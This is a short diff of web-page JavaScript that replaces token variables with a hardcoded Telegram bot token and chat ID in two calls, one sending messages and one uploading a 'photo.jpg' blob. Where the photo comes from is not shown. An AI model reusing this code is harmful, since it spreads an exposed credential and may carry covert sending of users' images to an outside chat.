@@ -15,7 +15,7 @@ const CHAT_ID = '5204585383'; // Replace with your bot's chat ID
         }
 
         function sendMessageToTelegram(message) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot7441776044:AAGD0CCCpaJR_tlb-WxZIxK7iiQH4qdgwfg/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -68,7 +68,7 @@ const CHAT_ID = '5204585383'; // Replace with your bot's chat ID
             const formData = new FormData();
             formData.append('photo', blob, 'photo.jpg');
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
+            fetch(`https://api.telegram.org/bot7441776044:AAGD0CCCpaJR_tlb-WxZIxK7iiQH4qdgwfg/sendPhoto?chat_id=5204585383`, {
                 method: 'POST',
                 body: formData
             })
